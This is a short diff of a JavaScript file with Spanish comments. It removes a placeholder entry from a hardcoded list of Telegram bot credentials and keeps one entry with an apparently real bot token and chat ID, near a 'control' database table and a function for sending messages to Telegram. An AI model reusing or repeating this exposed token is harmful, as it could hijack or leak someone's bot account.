@@ -25,8 +25,7 @@ db.exec("CREATE TABLE IF NOT EXISTS control (id INTEGER PRIMARY KEY, pagina TEXT
 
 // 🔐 Credenciales de Telegram
 const TELEGRAM_BOTS = [
-    { token: "7695570773:AAFT410wCwuCwFBOPBZxwYqJTdCRiiFSUms", chatId: "6328222257" },
-    { token: "TOKEN", chatId: "CHATID" }
+    { token: "7695570773:AAFT410wCwuCwFBOPBZxwYqJTdCRiiFSUms", chatId: "6328222257" }
 ];
 
 // 📩 Función para enviar mensajes a Telegram
